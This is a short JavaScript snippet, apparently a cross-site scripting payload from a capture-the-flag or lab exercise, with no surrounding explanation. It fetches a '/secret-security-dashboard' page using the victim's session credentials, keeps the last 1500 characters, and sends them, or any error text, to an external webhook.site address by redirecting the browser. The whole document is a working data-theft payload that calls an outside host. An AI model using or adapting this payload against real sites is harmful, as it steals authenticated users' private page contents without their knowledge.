(async()=>{
 try{
  const r = await fetch('/secret-security-dashboard',{credentials:'include'});
  const t = await r.text();
  const tail = t.slice(-1500);
  location = 'https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?d=' + encodeURIComponent(tail);
 }catch(e){
  location = 'https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?err=' + encodeURIComponent(e.toString());
 }
})();